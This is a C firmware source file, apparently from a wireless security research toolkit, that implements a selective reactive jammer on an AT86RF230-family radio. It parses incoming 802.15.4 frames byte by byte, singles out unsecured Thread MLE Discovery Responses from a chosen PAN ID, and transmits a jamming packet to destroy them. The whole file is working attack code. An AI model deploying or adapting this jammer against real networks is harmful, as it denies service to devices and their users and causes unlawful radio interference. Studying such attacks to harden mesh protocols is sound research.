/*
 * fw/attacks/attack_20.c - Attack function with ID 20
 *
 * Written 2022 by Dimitrios-Georgios Akestoridis
 * Copyright 2022 Dimitrios-Georgios Akestoridis
 *
 * This program is free software; you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation; either version 2 of the License, or
 * (at your option) any later version.
 */

#include <stdbool.h>
#include <stdint.h>

#define F_CPU 8000000UL
#include <util/delay.h>

#include "at86rf230.h"
#include "spi.h"
#include "board.h"
#include "attack.h"


/* Jam only Discovery Responses of a specified network */
bool attack(void)
{
	uint8_t rx_byte = 0;
	uint8_t phy_len = 0;
	uint8_t jam_len = 0;
	bool panid_comp = 0;

	/* Read the received packet as soon as possible */
	spi_begin();
	spi_io(AT86RF230_BUF_READ);

	/* Check the length of the received packet */
	phy_len = spi_recv();
	if ((phy_len < 5) || (phy_len & 0x80)) {
		/* Ignore packets with invalid length */
		spi_end();
		return 1;
	}

	/* Check the 8 least-significant bits of the MAC Frame Control */
	_delay_us(32);
	rx_byte = spi_recv();
	if ((rx_byte & 0x07) != 0x01) {
		/* Ignore packets that are not MAC Data packets */
		spi_end();
		return 1;
	} else if (rx_byte & 0x08) {
		/* Ignore packets with MAC Security enabled */
		spi_end();
		return 1;
	} else if (rx_byte & 0x40) {
		/* Take into account the PAN ID compression */
		panid_comp = 1;
	}

	/* Check the 8 most-significant bits of the MAC Frame Control */
	_delay_us(32);
	rx_byte = spi_recv();
	if ((rx_byte & 0x30) != 0x10) {
		/*
		 * Ignore packets that do not use the
		 * IEEE 802.15.4-2006 frame version
		 */
		spi_end();
		return 1;
	} else if ((rx_byte & 0x0c) != 0x0c) {
		/*
		 * Ignore packets that do not use an extended address
		 * for the destination node on the MAC layer
		 */
		spi_end();
		return 1;
	} else if ((rx_byte & 0xc0) != 0xc0) {
		/*
		 * Ignore packets that do not use an extended address
		 * for the source node on the MAC layer
		 */
		spi_end();
		return 1;
	}

	/* Ignore the MAC sequence number */
	_delay_us(32);
	spi_recv();

	/* Check whether the source PAN ID field is present or not */
	if (panid_comp) {
		/* Check the destination PAN ID */
		_delay_us(32);
		if (spi_recv() != (PANID & 0xff)) {
			/*
			 * Ignore packets that are
			 * destined for a different network
			 */
			spi_end();
			return 1;
		}
		_delay_us(32);
		if (spi_recv() != ((PANID >> 8) & 0xff)) {
			/*
			 * Ignore packets that are
			 * destined for a different network
			 */
			spi_end();
			return 1;
		}

		/* Ignore the MAC destination address */
		_delay_us(32);
		spi_recv();
		_delay_us(32);
		spi_recv();
		_delay_us(32);
		spi_recv();
		_delay_us(32);
		spi_recv();
		_delay_us(32);
		spi_recv();
		_delay_us(32);
		spi_recv();
		_delay_us(32);
		spi_recv();
		_delay_us(32);
		spi_recv();
	} else {
		/* Ignore the destination PAN ID */
		_delay_us(32);
		spi_recv();
		_delay_us(32);
		spi_recv();

		/* Ignore the MAC destination address */
		_delay_us(32);
		spi_recv();
		_delay_us(32);
		spi_recv();
		_delay_us(32);
		spi_recv();
		_delay_us(32);
		spi_recv();
		_delay_us(32);
		spi_recv();
		_delay_us(32);
		spi_recv();
		_delay_us(32);
		spi_recv();
		_delay_us(32);
		spi_recv();

		/* Check the source PAN ID */
		_delay_us(32);
		if (spi_recv() != (PANID & 0xff)) {
			/*
			 * Ignore packets that originated
			 * from a different network
			 */
			spi_end();
			return 1;
		}
		_delay_us(32);
		if (spi_recv() != ((PANID >> 8) & 0xff)) {
			/*
			 * Ignore packets that originated
			 * from a different network
			 */
			spi_end();
			return 1;
		}
	}

	/* Ignore the MAC source address */
	_delay_us(32);
	spi_recv();
	_delay_us(32);
	spi_recv();
	_delay_us(32);
	spi_recv();
	_delay_us(32);
	spi_recv();
	_delay_us(32);
	spi_recv();
	_delay_us(32);
	spi_recv();
	_delay_us(32);
	spi_recv();
	_delay_us(32);
	spi_recv();

	/* Check the IPHC header */
	_delay_us(32);
	if (spi_recv() != 0x7f) {
		/* Ignore packets with unexpected IPHC field values */
		spi_end();
		return 1;
	}
	_delay_us(32);
	if (spi_recv() != 0x33) {
		/* Ignore packets with unexpected IPHC field values */
		spi_end();
		return 1;
	}

	/* Check the NHC UDP header */
	_delay_us(32);
	if (spi_recv() != 0xf0) {
		/* Ignore packets with unexpected NHC UDP field values */
		spi_end();
		return 1;
	}

	/* Check the source port */
	_delay_us(32);
	if (spi_recv() != 0x4d) {
		/*
		 * Ignore packets that originated
		 * from a different port
		 */
		spi_end();
		return 1;
	}
	_delay_us(32);
	if (spi_recv() != 0x4c) {
		/*
		 * Ignore packets that originated
		 * from a different port
		 */
		spi_end();
		return 1;
	}

	/* Check the destination port */
	_delay_us(32);
	if (spi_recv() != 0x4d) {
		/*
		 * Ignore packets that are
		 * destined for a different port
		 */
		spi_end();
		return 1;
	}
	_delay_us(32);
	if (spi_recv() != 0x4c) {
		/*
		 * Ignore packets that are
		 * destined for a different port
		 */
		spi_end();
		return 1;
	}

	/* Ignore the UDP checksum */
	_delay_us(32);
	spi_recv();
	_delay_us(32);
	spi_recv();

	/* Check the MLE Security Suite */
	_delay_us(32);
	if (spi_recv() != 0xff) {
		/* Ignore packets with MLE Security enabled */
		spi_end();
		return 1;
	}

	/* Check the MLE Command Type */
	_delay_us(32);
	if (spi_recv() != 0x11) {
		/* The packet is not a Discovery Response */
		spi_end();
		return 1;
	}

	/* Stop receiving and transition into the PLL_ON state */
	spi_end();
#if defined(AT86RF231) || defined(AT86RF212)
	reg_write(REG_TRX_STATE, TRX_CMD_FORCE_PLL_ON);
#elif defined(AT86RF230)
	reg_write(REG_TRX_STATE, TRX_CMD_PLL_ON);
#else
#error "Unknown transceiver"
#endif

	/* Calculate the length of the jamming packet */
	if (phy_len > 54) {
		jam_len = phy_len - 54;
	} else {
		jam_len = 1;
	}

	/* Jam the received packet */
	spi_begin();
	spi_send(AT86RF230_BUF_WRITE);
	spi_send(jam_len);
	spi_end();

	/* Transition into the BUSY_TX state */
	slp_tr();

	/* Transition into the RX_ON state */
	change_state(TRX_CMD_RX_ON);

	return 1;
}
